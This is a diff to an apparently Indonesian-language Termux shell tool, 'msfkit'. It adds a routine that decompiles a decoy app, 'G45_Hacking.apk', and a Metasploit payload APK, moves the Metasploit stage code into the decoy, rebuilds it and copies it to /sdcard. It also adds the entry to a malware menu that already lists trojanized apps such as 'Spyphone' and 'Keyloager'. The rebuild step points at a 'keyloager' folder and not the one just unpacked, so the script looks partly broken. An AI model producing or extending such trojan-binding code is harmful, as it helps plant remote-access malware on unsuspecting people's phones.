@@ -775,6 +775,29 @@ sleep 7
 _pill
 }
 
+g45(){
+clear
+mallware
+echo $hi"                 wait for 35 minutes            "
+echo
+cd && cd msfkit && cd Payload
+mv -f G45_Hacking.apk ../Malware && cd && cd msfkit && cd Malware
+apktool d G45_Hacking.apk -o G45Hacking && rm -fr G45_Hacking.apk
+apktool d payload.apk -o payload && rm -fr payload.apk && cd
+cd msfkit/Malware && rm -fr G45Hacking/smali/com/metasploit/stage
+mv -f payload/smali/com/metasploit/stage G45Hacking/smali/com/metasploit/stage && cd
+cd msfkit/Malware && apktool b keyloager -o G45_Hacking.apk && cd
+cd msfkit/Malware && mv -f G45_Hacking.apk /sdcard && cd
+cd msfkit/Malware && rm -fr * && cd
+cd msfkit && rm -fr Payload
+echo $hi
+echo "selesai"
+echo "----------------------------------------------------";
+sleep 7
+_pill
+}
+
+
 kylg(){
 ipori
 echo $me
@@ -1074,13 +1097,14 @@ mlwr(){
 echo $me
 mallware
 echo
-echo $me"[1]$pu Shopee Pink         "      $me"[7] $pu Droid Sqli          "
-echo $me"[2]$pu Spyphone            "      $me"[8] $pu Vidmate             "
-echo $me"[3]$pu Speedtest           "      $me"[9] $pu Uc Mini             " 
-echo $me"[4]$pu Keyboard Hacker     "      --------------------
-echo $me"[5]$pu Keyloager           "      $me"[10]$pu Layar Kaca21        "
-echo $me"[6]$pu Wps Hack            "      $me"[11]$pu Indoxxi Bioskop     "
-echo $me"[0]$pu kembali             "      $me"[12]$pu Design Aplikasi     "
+echo $me"[1]$pu Shopee Pink         "      $me"[8] $pu Vidmate             " 
+echo $me"[2]$pu Spyphone            "      $me"[9] $pu Uc Mini             " 
+echo $me"[3]$pu Speedtest           "      --------------------
+echo $me"[4]$pu Keyboard Hacker     "      $me"[10]$pu Layar Kaca21        "
+echo $me"[5]$pu Keyloager           "      $me"[11]$pu Indoxxi Bioskop     "
+echo $me"[6]$pu Wps Hack            "      $me"[12]$pu Design Aplikasi     "
+echo $me"[7]$pu Droid Sqli          "	   $me"[13]$pu G45 Hacking         "
+echo $me"[0]$pu kembali             "      
 echo $me
 read -p "masukan pilihan : " pi
 }
@@ -1179,6 +1203,10 @@ then
 clear
 dsn
 
+elif [ $pi = "13" ];
+then
+clear
+g45
 
 elif [ $pi = "0" ];
 then
